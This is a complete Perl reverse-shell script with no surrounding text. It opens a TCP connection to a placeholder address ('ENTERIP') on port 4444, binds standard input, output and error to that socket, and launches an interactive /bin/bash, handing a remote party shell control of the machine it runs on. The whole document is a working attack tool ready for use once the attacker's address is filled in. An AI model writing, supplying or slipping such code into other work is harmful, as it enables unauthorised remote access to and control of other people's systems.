use Socket;
$ipAddress="ENTERIP";
$port=4444;
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($port,inet_aton($ipAddress)))){
 open(STDIN,">&S");
 open(STDOUT,">&S");
 open(STDERR,">&S");
 exec("/bin/bash -i");
};
